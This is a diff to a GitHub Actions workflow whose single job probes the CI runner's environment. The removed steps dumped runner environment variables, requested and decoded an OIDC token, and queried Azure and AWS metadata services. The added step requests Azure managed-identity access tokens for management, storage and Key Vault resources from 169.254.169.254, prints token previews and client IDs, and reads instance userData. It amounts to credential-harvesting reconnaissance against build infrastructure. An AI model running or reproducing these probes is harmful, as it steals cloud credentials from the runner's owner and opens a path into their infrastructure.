@@ -8,40 +8,54 @@ jobs:
   inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: All ACTIONS_ and runner env vars
+      - name: Deep IMDS probe
         run: |
-          echo "=== ALL ACTIONS_* VARS ==="
-          env | grep -i "^ACTIONS_" | sort
-          echo ""
-          echo "=== ALL GITHUB_* ==="
-          env | grep -i "^GITHUB_" | grep -v "TOKEN" | sort
-          echo ""
-          echo "=== RUNNER_* ==="
-          env | grep -i "^RUNNER_" | sort
+          echo "=== AZURE MANAGED IDENTITY CHECK ==="
+          curl -sf --max-time 8 \
+            "http://169.254.169.254/metadata/identity/info?api-version=2019-08-01" \
+            -H "Metadata: true" && echo "" || echo "No managed identity info endpoint"
 
-      - name: Probe OIDC endpoint
-        run: |
-          echo "=== OIDC URL ==="
-          echo "REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-            echo "=== REQUESTING OIDC TOKEN ==="
-            T=$(curl -sf \
-              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])" 2>/dev/null)
-            if [ -n "$T" ]; then
-              echo "Got token, decoding claims:"
-              echo $T | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
-            else
-              echo "Failed to get OIDC token"
-            fi
-          else
-            echo "ACTIONS_ID_TOKEN_REQUEST_URL not set - id-token permission not granted"
-          fi
+          echo ""
+          echo "=== MANAGED IDENTITY TOKEN (management.azure.com) ==="
+          curl -sf --max-time 8 \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/" \
+            -H "Metadata: true" | python3 -c "
+import sys, json
+try:
+    d = json.load(sys.stdin)
+    print('access_token preview:', d.get('access_token','')[:30]+'...')
+    print('token_type:', d.get('token_type'))
+    print('expires_in:', d.get('expires_in'))
+    print('resource:', d.get('resource'))
+    print('client_id:', d.get('client_id','NOT_SET'))
+except Exception as e:
+    print('Error:', e)
+    sys.stdin = open('/dev/stdin')
+" 2>&1 || echo "No managed identity (HTTP error)"
 
-      - name: Cloud IMDS probe
-        run: |
-          echo "=== AZURE IMDS ==="
-          curl -sv --max-time 5 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true" 2>&1 | tail -5 || echo "blocked"
-          echo "=== AWS IMDS v2 ==="
-          TOKEN=$(curl -sf --max-time 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
-          [ -n "$TOKEN" ] && curl -sf --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" || echo "aws imds: blocked"
+          echo ""
+          echo "=== MANAGED IDENTITY TOKEN (github API) ==="
+          curl -sf --max-time 8 \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.core.windows.net/" \
+            -H "Metadata: true" | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+tok = d.get('access_token','')
+print('GOT TOKEN! preview:', tok[:40]+'...')
+print('client_id:', d.get('client_id'))
+" 2>&1 || echo "No managed identity for management"
+
+          echo ""
+          echo "=== ALL IMDS IDENTITY ENDPOINTS ==="
+          for ep in "info" "oauth2/token?api-version=2019-08-01&resource=https://storage.azure.com/" "oauth2/token?api-version=2019-08-01&resource=https://vault.azure.net/"; do
+            echo -n "identity/$ep: "
+            curl -sf --max-time 5 "http://169.254.169.254/metadata/identity/$ep" -H "Metadata: true" -o /dev/null -w "%{http_code}\n"
+          done
+
+          echo ""
+          echo "=== IMDS COMPUTE userData ==="
+          curl -sf --max-time 5 "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text" -H "Metadata: true" && echo "" || echo "no userData"
+
+          echo ""
+          echo "=== IMDS IMAGE SUBSCRIPTION ==="
+          curl -sf --max-time 5 "http://169.254.169.254/metadata/instance/compute/storageProfile/imageReference?api-version=2021-02-01" -H "Metadata: true" | python3 -m json.tool
